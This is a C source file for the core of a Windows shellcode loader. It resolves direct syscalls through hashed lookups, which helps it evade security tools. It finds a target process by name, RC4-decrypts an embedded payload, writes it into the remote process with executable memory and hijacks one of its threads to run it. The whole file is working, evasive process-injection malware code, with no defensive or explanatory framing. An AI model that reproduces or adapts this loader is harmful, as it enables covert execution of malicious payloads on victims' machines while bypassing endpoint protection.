/*
    inject.c - Core loader logic
    ---------------------------
    Purpose:
        - Implements the main loader functionality, including syscall and API initialization, process handle acquisition, RC4 decryption, and remote injection.
    Main Functions:
        - Initializes syscall and API tables for direct system call usage.
        - Finds and opens the target process for injection.
        - Decrypts the payload using RC4 encryption.
        - Injects and hijacks threads in the target process to execute the payload.
    Role in Project:
        - Provides the core mechanisms for process injection and payload delivery, supporting the main loader flow.
*/

#include <Windows.h>
#include <TlHelp32.h>


#include "Structs.h"
#include "Common.h"
#include "Debug.h"


VX_TABLE		g_Sys = { 0 };
API_HASHING		g_Api = { 0 };


// original key
unsigned char Rc4Key[KEY_SIZE] = {
        0x69, 0xD1, 0xD7, 0xB9, 0x25, 0xD9, 0x3E, 0x40, 0x9B, 0x95, 0xF4, 0x9F, 0x3B, 0xBF, 0x9B, 0x7F };


unsigned char EncRc4Key[KEY_SIZE] = {
       0x28, 0x54, 0x3F, 0xAC, 0x64, 0x0C, 0xE3, 0xDE, 0x39, 0x19, 0xB5, 0xB1, 0xEE, 0x3C, 0xAE, 0xE0 };

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL InitializeSyscalls() {

    // Get the PEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA) {
#ifdef DEBUG
        PRINTA("[!] RtlGetThreadEnvironmentBlock Failed \n");
#endif // DEBUG
        return FALSE;
    }
    // Get NTDLL module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Get the EAT of NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL) {
#ifdef DEBUG
        PRINTA("[!] RtlGetThreadEnvironmentBlock Failed \n");
#endif // DEBUG
        return FALSE;
    }

    g_Sys.NtClose.uHash = NtClose_JOAA;
    g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
    g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
    g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
    g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;
    g_Sys.NtSuspendThread.uHash = NtSuspendThread_JOAA;
    g_Sys.NtGetContextThread.uHash = NtGetContextThread_JOAA;
    g_Sys.NtResumeThread.uHash = NtResumeThread_JOAA;
    g_Sys.NtSetContextThread.uHash = NtSetContextThread_JOAA;
    g_Sys.NtAllocateVirtualMemory.uHash = NtAllocateVirtualMemory_JOAA;
    g_Sys.NtWriteVirtualMemory.uHash = NtWriteVirtualMemory_JOAA;
    g_Sys.NtProtectVirtualMemory.uHash = NtProtectVirtualMemory_JOAA;
    g_Sys.NtOpenThread.uHash = NtOpenThread_JOAA;
    g_Sys.NtOpenProcess.uHash = NtOpenProcess_JOAA;

#ifdef DEBUG
    PRINTA("[!] GetVxTableEntry  Successed \n");
#endif // DEBUG

    // initialize the syscalls

    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtSuspendThread))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtGetContextThread))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtResumeThread))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtSetContextThread))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtAllocateVirtualMemory))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWriteVirtualMemory))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtProtectVirtualMemory))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtOpenThread))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtOpenProcess))
        return FALSE;

#ifdef DEBUG
    PRINTA("[!] GetVxTableEntry  Successed \n");
#endif // DEBUG


    //	User32.dll exported
    g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
    g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
    g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
    g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
    g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

    if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
    {
#ifdef DEBUG
        PRINTA("[!] API Hashing  Failed \n");
#endif // DEBUG
        return FALSE;
    }
    // 	Kernel32.dll exported
    g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
    g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
    g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
    g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
    g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
    g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);
    g_Api.pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateToolhelp32Snapshot_JOAA);
    g_Api.pThread32First = (fnThread32First)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), Thread32First_JOAA);
    g_Api.pThread32Next = (fnThread32Next)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), Thread32Next_JOAA);

    if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
        return FALSE;

    return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

    ULONG							uReturnLen1 = NULL,
        uReturnLen2 = NULL;
    PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
    PVOID							pValueToFree = NULL;
    NTSTATUS						STATUS = NULL;

    // this will fail (with status = STATUS_INFO_LENGTH_MISMATCH), but that's ok, because we need to know how much to allocate (uReturnLen1)
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);

    // allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        return FALSE;
    }

    // since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
    pValueToFree = SystemProcInfo;

    // calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    if (STATUS != 0x0) {
#ifdef DEBUG
        PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG

        return FALSE;
    }

    while (TRUE) {

        // small check for the process's name size
        // comparing the enumerated process name to what we want to target
        if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
            // openning a handle to the target process and saving it, then breaking 
            *pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
            *phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
            break;
        }

        // if NextEntryOffset is 0, we reached the end of the array
        if (!SystemProcInfo->NextEntryOffset)
            break;

        // moving to the next element in the array
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    // freeing using the initial address
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // checking if we got the target's process handle
    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
#ifdef DEBUG
        PRINTA("[!] PID = %d \n", *pdwPid);
#endif // DEBUG
    return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//



// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS        STATUS = NULL;
    BYTE            RealKey[KEY_SIZE] = { 0 };
    int             b = 0;

    // brute forcing the key:
    for (b = 0; b < 0x100; b++) {
        if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
            break;
    }
#ifdef DEBUG
    PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
#endif // DEBUG

    // decrypting the key
    /*
    for (int i = 0; i < KEY_SIZE; i++) {
        RealKey[i] = (BYTE)(((pRc4Key[i] - i) ^ b) & 0xFF);
        
    }
    */
    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = Rc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // using Cryptsp.dll instead of Advapi32.dll, since 'GetProcAddressH' doesnt not handle forwarded functions yet.
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Cryptsp"), SystemFunction032_JOAA);

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
#ifdef DEBUG
        PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
#endif // DEBUG
        return FALSE;
    }

    return TRUE;
}


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// minimal OBJECT_ATTRIBUTES and InitializeObjectAttributes
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PVOID           ObjectName;               // we're not using names here, so PVOID is fine
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) \
    do {                                            \
        (p)->Length                   = sizeof( OBJECT_ATTRIBUTES );   \
        (p)->RootDirectory            = (r);        \
        (p)->Attributes               = (a);        \
        (p)->ObjectName               = (n);        \
        (p)->SecurityDescriptor       = (s);        \
        (p)->SecurityQualityOfService = NULL;       \
    } while(0)


BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT   ThreadCtx = { 0 };
    ULONG     previousCount;
    NTSTATUS  status = NULL;


    // 1) Prepare to suspend
    ThreadCtx.ContextFlags = CONTEXT_ALL;
    HellsGate(g_Sys.NtSuspendThread.wSystemCall);
    status = HellDescent(hThread, &previousCount);
    if ((status) != 0) {
#ifdef DEBUG
        PRINTA("[!] NtSuspendThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }

    // 2) Grab the thread context
    HellsGate(g_Sys.NtGetContextThread.wSystemCall);
    status = HellDescent(hThread, &ThreadCtx);
    if ((status) != 0) {
#ifdef DEBUG
        PRINTA("[!] NtGetContextThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        // restore state before returning
        HellsGate(g_Sys.NtResumeThread.wSystemCall);
        HellDescent(hThread, &previousCount);
        return FALSE;
    }

    // 3) Overwrite RIP/EIP
#ifdef _M_X64
    ThreadCtx.Rip = (DWORD64)pAddress;
#else
    ThreadCtx.Eip = (DWORD)pAddress;
#endif

    // 4) Write the modified context back
    HellsGate(g_Sys.NtSetContextThread.wSystemCall);
    status = HellDescent(hThread, &ThreadCtx);
    if ((status) != 0) {
#ifdef DEBUG
        PRINTA("[!] NtSetContextThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        // restore state before returning
        HellsGate(g_Sys.NtResumeThread.wSystemCall);
        HellDescent(hThread, &previousCount);
        return FALSE;
    }

    // 5) Pause for operator
#ifdef DEBUG
    PRINTA("\t[#] Press <Enter> To Run ... ");
#endif // DEBUG

    // 6) Resume the thread
    HellsGate(g_Sys.NtResumeThread.wSystemCall);
    status = HellDescent(hThread, &previousCount);
    if ((status) != 0) {
#ifdef DEBUG
        PRINTA("[!] NtResumeThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }

    // 7) Wait indefinitely for the thread to exit
    HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
    status = HellDescent(hThread, FALSE, NULL);
    if ((status) != 0) {
#ifdef DEBUG
        PRINTA("[!] NtWaitForSingleObject failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }

    return TRUE;
}


BOOL InjectShellcodeToRemoteProcess(
    IN  HANDLE  hProcess,
    IN  PBYTE   pShellcode,
    IN  SIZE_T  sSizeOfShellcode,
    OUT PVOID* ppAddress
) {
    NTSTATUS STATUS;
    PVOID    baseAddress = NULL;
    SIZE_T   regionSize = sSizeOfShellcode;
    SIZE_T   bytesWritten = 0;
    ULONG    oldProtect = 0;

    // 1) Allocate RW memory in remote process
    HellsGate(g_Sys.NtAllocateVirtualMemory.wSystemCall);
    STATUS = HellDescent(
        hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (STATUS != 0x0) {
#ifdef DEBUG
        PRINTA("[!] NtAllocateVirtualMemory failed: 0x%0.8X\n", STATUS);
#endif
        return FALSE;
    }

    *ppAddress = baseAddress;
#ifdef DEBUG
    PRINTA("[i] Allocated RW memory at 0x%p (size = %llu bytes)\n", baseAddress, (unsigned long long)regionSize);
    PRINTA("[#] Press <Enter> to write payload…\n");
    //GETCHARA();
#endif

    // 2) Write encrypted shellcode to allocated memory
    HellsGate(g_Sys.NtWriteVirtualMemory.wSystemCall);
    STATUS = HellDescent(
        hProcess,
        baseAddress,
        pShellcode,
        regionSize,
        &bytesWritten
    );
    if (STATUS != 0x0 || bytesWritten != regionSize) {
#ifdef DEBUG
        PRINTA("[!] NtWriteVirtualMemory failed: 0x%0.8X (wrote %llu bytes)\n",
            STATUS, (unsigned long long)bytesWritten);
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINTA("[i] Wrote %zu bytes of shellcode\n", bytesWritten);
#endif

    // 3) Change memory protection to RX
    HellsGate(g_Sys.NtProtectVirtualMemory.wSystemCall);
    STATUS = HellDescent(
        hProcess,
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    if (STATUS != 0x0) {
#ifdef DEBUG
        PRINTA("[!] NtProtectVirtualMemory failed: 0x%0.8X\n", STATUS);
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINTA("[i] Changed memory to PAGE_EXECUTE_READ (old = 0x%X)\n", oldProtect);
    //GETCHARA();
    //GETCHARA();
    //GETCHARA();
#endif

    return TRUE;
}



BOOL GetRemoteThreadHandle(
    IN  DWORD   dwProcessId,
    OUT PDWORD  dwThreadId,
    OUT PHANDLE hThread
) {
    HANDLE        hSnapshot = NULL;
    THREADENTRY32 teEntry = { 0 };
    NTSTATUS      status;
    CLIENT_ID     cid;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    teEntry.dwSize = sizeof(THREADENTRY32);

    // 1) Take a snapshot of all threads in the system
    hSnapshot = g_Api.pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
        PRINTA("\t[!] CreateToolhelp32Snapshot failed: %u\n", GetLastError());
#endif // DEBUG
        return FALSE;
    }

    // 2) Iterate until we find a thread in our target process
    if (!g_Api.pThread32First(hSnapshot, &teEntry)) {
#ifdef DEBUG
        PRINTA("\n\t[!] Thread32First failed: %u\n", GetLastError());
#endif // DEBUG
        HellsGate(g_Sys.NtClose.wSystemCall);
        status = HellDescent(hSnapshot);
        // CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (teEntry.th32OwnerProcessID == dwProcessId) {
            *dwThreadId = teEntry.th32ThreadID;

            // Prepare CLIENT_ID for NtOpenThread
            cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
            cid.UniqueThread = (HANDLE)(ULONG_PTR)teEntry.th32ThreadID;

            // 3) Open the thread via syscall
            HellsGate(g_Sys.NtOpenThread.wSystemCall);
            status = HellDescent(
                hThread,                // PHANDLE ThreadHandle
                THREAD_ALL_ACCESS,      // ACCESS_MASK DesiredAccess
                &objAttr,                   // POBJECT_ATTRIBUTES ObjectAttributes
                &cid                    // PCLIENT_ID ClientId
            );

            if ((status) != 0 || *hThread == NULL) {
#ifdef DEBUG
                PRINTA("\n\t[!] NtOpenThread failed: 0x%0.8X\n", status);
#endif // DEBUG
                // keep searching in case another thread works
                continue;
            }
            break;
        }
    } while (g_Api.pThread32Next(hSnapshot, &teEntry));

    // 4) Clean up the snapshot handle via syscall
    HellsGate(g_Sys.NtClose.wSystemCall);
    HellDescent(hSnapshot);

    // 5) Verify we found and opened a thread
    if (*dwThreadId == 0 || *hThread == NULL) {
        return FALSE;
    }

    return TRUE;
}



BOOL RemoteInjectAndHijack(
    IN  LPCWSTR szProcessName,
    IN  PBYTE   pShellcode,
    IN  SIZE_T  sShellcodeSize
) {
    DWORD   dwProcessId = 0;
    HANDLE  hProcess = NULL;
    PVOID   pRemoteAddr = NULL;
    DWORD   dwThreadId = 0;
    HANDLE  hThread = NULL;
    BOOL    ok = FALSE;

    // 1) Decrypt the shellcode locally before injection
    if (!Rc4EncryptionViSystemFunc032(EncRc4Key, pShellcode, KEY_SIZE, (DWORD)sShellcodeSize)) {
#ifdef DEBUG
        PRINTA("[!] RC4 decryption in memory failed\n");
#endif
        goto cleanup;
    }
#ifdef DEBUG
    /*
    PRINTA("[*] Decoded shellcode:\n");
    for (SIZE_T i = 0; i < sShellcodeSize; i++) {
        PRINTA("%02X ", pShellcode[i]);
        if ((i + 1) % 16 == 0) PRINTA("\n");
    }
    PRINTA("\n");
    */
#endif
    // 2) Find & open the target process using NtQuerySystemInformation
    if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
#ifdef DEBUG
        PRINTA("[!] Could not locate or open target process: %ws\n", szProcessName);
#endif
        goto cleanup;
    }

    // 3) Allocate + write the decrypted shellcode to remote memory
    if (!InjectShellcodeToRemoteProcess(hProcess, pShellcode, sShellcodeSize, &pRemoteAddr)) {
#ifdef DEBUG
        PRINTA("[!] Failed to inject shellcode into target process\n");
#endif
        goto cleanup;
    }

    // 4) Find a remote thread in that process
    if (!GetRemoteThreadHandle(dwProcessId, &dwThreadId, &hThread)) {
#ifdef DEBUG
        PRINTA("[!] Failed to locate a thread in the target process (PID: %u)\n", dwProcessId);
#endif
        goto cleanup;
    }

    // 5) Hijack thread to point at shellcode
    if (!HijackThread(hThread, pRemoteAddr)) {
#ifdef DEBUG
        PRINTA("[!] Failed to hijack remote thread (TID: %u)\n", dwThreadId);
#endif
        goto cleanup;
    }

    ok = TRUE;

cleanup:
    if (hThread) {
        HellsGate(g_Sys.NtClose.wSystemCall);
        HellDescent(hThread);
    }
    if (hProcess) {
        HellsGate(g_Sys.NtClose.wSystemCall);
        HellDescent(hProcess);
    }
    return ok;
}


